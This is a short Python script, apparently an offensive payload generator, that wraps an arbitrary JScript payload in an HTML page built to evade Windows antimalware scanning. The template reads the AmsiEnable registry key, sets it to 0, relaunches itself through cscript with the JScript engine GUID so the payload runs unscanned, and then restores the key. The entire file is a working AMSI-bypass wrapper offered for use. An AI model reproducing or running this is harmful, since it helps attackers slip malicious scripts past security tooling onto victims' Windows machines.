import sys

template="""
<html>
<head>
<script language="JScript">
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
try{
var AmsiEnable = sh.RegRead(key);
if(AmsiEnable!=0){
throw new Error(1, '');
}
%(jscript_payload)s
}catch(e){
sh.RegWrite(key, 0, "REG_DWORD"); sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
sh.RegWrite(key, 1, "REG_DWORD");
WScript.Quit(1);
}
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
"""

jscript_file = sys.argv[1]
with open(jscript_file, 'r') as f:
    jscript_payload = f.read()
    code = template % {'jscript_payload': jscript_payload}
    print(code)